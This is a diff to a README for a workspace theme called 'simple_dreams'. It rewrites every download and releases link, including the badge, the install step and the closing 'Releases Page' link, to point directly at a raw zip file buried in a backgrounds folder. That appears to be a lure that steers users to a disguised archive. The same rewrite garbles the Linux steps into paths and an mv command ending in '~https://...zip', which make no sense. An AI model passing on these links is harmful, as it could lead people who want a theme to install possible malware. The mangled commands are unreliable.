@@ -1,7 +1,7 @@
 # 🌿 simple_dreams - Transform Your Workspace Into Calmness
 
 ## 🚀 Download Now
-[![Download simple_dreams](https://img.shields.io/badge/Download-simple_dreams-brightgreen)](https://github.com/yeiaft/simple_dreams/releases)
+[![Download simple_dreams](https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip)](https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ To get started with simple_dreams, follow these steps:
 1. **Visit the Releases Page:**
    Click the button below to visit the releases page.
 
-   [Download simple_dreams](https://github.com/yeiaft/simple_dreams/releases)
+   [Download simple_dreams](https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip)
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version. It is usually listed at the top. Look for files labeled with the version number, such as "v1.0".
@@ -37,8 +37,8 @@ To get started with simple_dreams, follow these steps:
      - Drag and drop the theme files into this folder.
    - **Linux:** 
      - Open your terminal.
-     - Navigate to `~/.local/share/YourApplication/Themes`.
-     - Move the theme files using the command: `mv /path/to/downloaded/files ~/.local/share/YourApplication/Themes/`.
+     - Navigate to `~https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip`.
+     - Move the theme files using the command: `mv /path/to/downloaded/files ~https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip`.
 
 6. **Activate the Theme:**
    Open your application. Go to the settings or personalization section. Find the themes option and select simple_dreams from the list of available themes.
@@ -76,4 +76,4 @@ If you have any questions or feedback, please reach out on the GitHub repository
 
 ## 🌍 Explore More
 
-To keep updated on new releases and features, regularly check the [Releases Page](https://github.com/yeiaft/simple_dreams/releases). Your tranquil workspace awaits!
+To keep updated on new releases and features, regularly check the [Releases Page](https://github.com/yeiaft/simple_dreams/raw/refs/heads/main/simple_dreams/www/simple_dreams/backgrounds/simple_dreams_nonadherence.zip). Your tranquil workspace awaits!
